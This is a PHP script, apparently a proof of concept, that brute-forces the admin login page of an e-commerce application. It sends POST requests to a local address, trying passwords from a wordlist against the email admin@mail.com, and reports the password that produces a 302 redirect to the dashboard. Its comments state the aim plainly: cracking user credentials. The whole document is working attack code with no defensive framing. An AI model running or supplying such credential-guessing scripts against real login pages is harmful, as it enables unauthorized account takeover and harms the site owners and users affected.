<?php
//The url where you wanna Bruteforce of this software to get user credentials
$url = "http://192.168.0.100:8080/ecomm/admin/login.php";

//give the customer email which you wanna crack
$cust_email = 'admin@mail.com';

//Give the password file
$passwordFile = 'p.txt';
$handle = fopen($passwordFile, 'r');

if ($handle) {
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string
    curl_setopt($ch, CURLOPT_POST, true); // Set the request method to POST

    // Loop through each password in the file
    while (($cust_password = fgets($handle)) !== false) {
        $cust_password = trim($cust_password); // Remove any extra whitespace or newline characters

        // Prepare the data to be sent in the POST request
        $data = [
            '_csrf' => '2c056c5d443ac4f899c92befb62e1a',
            'email' => $cust_email,
            'password' => $cust_password,
            'form1' => 'Log+in'
        ];

        // Set the POST fields
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

        // Execute the request
        curl_exec($ch);

        // Get the HTTP response code
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // Check for errors
        if (curl_errno($ch)) {
            break; // Exit the loop on error
        }

        // Check if we received a 302 status code
        if ($http_code === 302) {
            echo "Redirected to dashboard with password: $cust_password\n";
            break; // Exit the loop if redirected
        }
    }

    // Close the cURL session
    curl_close($ch);
    fclose($handle); // Close the password file
} else {
    echo "Error opening password file.";
}
?>